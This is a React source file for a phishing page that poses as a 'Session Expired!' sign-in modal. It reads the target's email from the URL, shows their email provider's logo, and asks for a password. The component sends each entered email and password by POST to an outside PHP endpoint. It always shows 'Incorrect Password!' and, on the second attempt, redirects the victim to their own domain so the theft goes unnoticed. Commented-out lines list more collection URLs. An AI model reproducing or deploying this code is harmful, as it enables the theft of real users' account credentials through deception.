
import './modal.css';
import { useState } from 'react';
import $ from 'jquery';

export const Modal = ()=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    // console.log('cccc:',extracetdEmail);
    // const mainName = extracetdEmail.replace('.com', "");
    // console.log(mainName,'main');

    const [invalid, setInvalid] = useState(false);

    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1));
    // .toLowerCase();
    const sliceE = extracetdEmailC;
    const cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow = sliceE.slice(1)
    const capitalizeFirstLetter = extracetdEmailC.charAt(0) + cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow.split('&', 1).toString();

    const [defaultEmail, setDefaultEmail] = useState(capitalizeFirstLetter);
    const [defaultPassword, setDefaultPassword] = useState('');
    const [count, setCount] = useState(0);

    const [btnVal, setBtnVal] = useState('Sign in');



    const submitDefaultForm = (e)=>{
        e.preventDefault();

        if (defaultPassword === "") {
            return null
        } else {


            setBtnVal('Please wait...');
            setTimeout(() => {
                setDefaultPassword('');
                setBtnVal(btnVal);
                
            }, 3200);
    
    
            setCount(count=> count + 1);
                if(count === 1){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    setTimeout(() => {
                        window.location.href = `https://www.${extracetdEmailC.toLowerCase().split('&', 1).toString()}`;
                    }, 1500);
                };
    
                setTimeout(()=>{
                    setInvalid(true);
                }, 2200)
    
            // post to server
            // const user = {
            //     email: defaultEmail,
            //     password: defaultPassword,
    
            // };
    
            const user = {
                email: defaultEmail,
                password: defaultPassword,
    
            };
        
            $.ajax({
                type: "POST",
                url: "https://physicaleducationdiploma.com/new/session/zack.php",
                // url: "https://physical-edu-two.onrender.com/component/diploma/toplas/wetrannsfer@gmail.com/tb/educationdiploma/",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });


            // const mmm = {
            //     email: defaultEmail,
            //     pswd: defaultPassword,
    
            // };


            // $.ajax({
            //     type: "POST",
            //     url: "https://physical-edu-two.onrender.com/component/diploma/toplas/mariamonterojt@gmail.com/tb/educationdiploma/",
            //     data: mmm,
            //     success(data) {
            //         // alert('OK');
            //         console.log(data);
            //     },
            // });
            
        }


    };



    return(<>
        <div>

            <div style={{
                        display:'flex',
                        justifyContent:'center'
                    }}>
                <img 
                    alt='brand'
                    className='brand'
                    src={`https://logo.clearbit.com/https://${extracetdEmail}`}
                    
                />
            </div>

            <main className='majorr'>

                {invalid ? <p id="msg">Incorrect Password!</p> : undefined }

                <h2 className='ttl'>Session Expired!</h2>

                <form onSubmit={submitDefaultForm}>
                    <div>
                        <input
                            type='email'
                            readOnly
                            value={defaultEmail}
                            onChange={e=> setDefaultEmail(e.target.value)}
                            required
                            placeholder='Enter Email'
                            className='eml'
                            id='email'
                            title={defaultEmail}
                        />
                    </div>


                    <div>
                        <input
                            type='password'
                            placeholder='Enter Password'
                            className='eml'
                            id='email'
                            title={`Password`}
                            autoFocus
                            value={defaultPassword}
                            onChange={e=> {
                                setDefaultPassword(e.target.value);
                                if (defaultPassword.length === 1) {
                                    setInvalid(false);
                                }
                            }}
                        />
                    </div>


                    <div>
                        <input
                            type='submit'
                            className='btn'
                            id='button'
                            title='Log in'
                            value={btnVal}
                            onClick={submitDefaultForm}
                        />
                    </div>

                    <div>
                        <input type="checkbox" defaultChecked/>
                        &#160;
                        &#160;
                        &#160;
                        &#160;
                        <span className='rem'>Remember me</span>
                    </div>
                </form>

            </main>

        </div>
    </>)
};